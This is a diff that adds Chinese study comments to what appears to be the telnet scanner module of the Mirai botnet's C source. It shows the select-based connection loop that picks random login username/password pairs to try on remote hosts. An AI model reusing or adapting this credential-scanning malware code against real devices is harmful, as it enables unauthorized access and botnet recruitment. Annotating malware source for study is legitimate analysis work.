@@ -40,13 +40,13 @@ uint32_t fake_time = 0;
 //将接收到的空字符替换为'A'
 int recv_strip_null(int sock, void *buf, int len, int flags)
 {
-    int ret = recv(sock, buf, len, flags);
+    int ret = recv(sock, buf, len, flags);   //从sock接收len长度的字符串到buf中
 
     if (ret > 0)
     {
         int i = 0;
 
-        for(i = 0; i < ret; i++)
+        for(i = 0; i < ret; i++)   //接收到的字符串长度
         {
             if (((char *)buf)[i] == 0x00)
             {
@@ -369,7 +369,8 @@ void scanner_init(void)
         //第三个参数是监视这些文件描述符的写变化的，即我们关心是否可以向这些文件中写入数据了
         //第四个参数：等待1s【阻塞】，1s之内有事件到来就返回文件描述符，否则在超时后不管怎样一定返回：文件无变化返回0，有变化返回一个正值。
         //返回值：负值：select错误;正值：某些文件可读写；0：等待超时，没有可读写或错误的文件
-        //返回时fdset_rd和fdset_wr会被修改
+        //返回时fdset_rd和fdset_wr会被修改，需要被读取/写入的文件描述符会被设置。其他监视的文件描述符会被clear。
+        //https://cloud.tencent.com/developer/article/1344972【Part：理解select模型】
         fake_time = time(NULL);  //重新获得当前时间，更新last_recv的时间
 
         for (i = 0; i < SCANNER_MAX_CONNS; i++)
@@ -379,13 +380,13 @@ void scanner_init(void)
             if (conn->fd == -1)
                 continue;
 
-            if (FD_ISSET(conn->fd, &fdset_wr)) /*测试conn->fd是否包含在集合fdset_wr中*/ 
+            if (FD_ISSET(conn->fd, &fdset_wr)) /* 测试conn->fd是否包含在集合fdset_wr中，也就是说这个文件描述符conn->fd需要写入 */ 
             {
                 int err = 0, ret = 0;
                 socklen_t err_len = sizeof (err);
 
                 ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
-                if (err == 0 && ret == 0)
+                if (err == 0 && ret == 0)  //如果套接字上没有发生错误
                 {
                     conn->state = SC_HANDLE_IACS;
                     conn->auth = random_auth_entry();   //随机获取一个登录用户名+密码尝试
@@ -399,7 +400,7 @@ void scanner_init(void)
 #ifdef DEBUG
                     printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
 #endif
-                    close(conn->fd);
+                    close(conn->fd);   //发生错误，直接关闭该套接字。不然下次getsockopt就不会获取到这个错误了。直接重置/初始化该socket。
                     conn->fd = -1;
                     conn->tries = 0;
                     conn->state = SC_CLOSED;
@@ -407,7 +408,7 @@ void scanner_init(void)
                 }
             }
 
-            if (FD_ISSET(conn->fd, &fdset_rd))  /*测试conn->fd是否包含在集合fdset_wr中*/ 
+            if (FD_ISSET(conn->fd, &fdset_rd))  /* 测试conn->fd是否包含在集合fdset_wr中，也就是说这个文件描述符conn->fd需要读取 */ 
             {
                 while (TRUE)
                 {
@@ -422,7 +423,7 @@ void scanner_init(void)
                         conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                     }
                     errno = 0;
-                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
+                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);   //接收尽可能多的字符【还剩下的缓冲区大小SCANNER_RDBUF_SIZE - conn->rdbuf_pos】
                     if (ret == 0)
                     {
 #ifdef DEBUG
@@ -457,14 +458,14 @@ void scanner_init(void)
                         }
                         break;
                     }
-                    conn->rdbuf_pos += ret;
-                    conn->last_recv = fake_time;
+                    conn->rdbuf_pos += ret;   //更新缓冲区指针，指向下一个空位置
+                    conn->last_recv = fake_time;    //更新接收到信息的时间
 
                     while (TRUE)
                     {
                         int consumed = 0;
 
-                        switch (conn->state)
+                        switch (conn->state)    
                         {
                         case SC_HANDLE_IACS:
                             if ((consumed = consume_iacs(conn)) > 0)
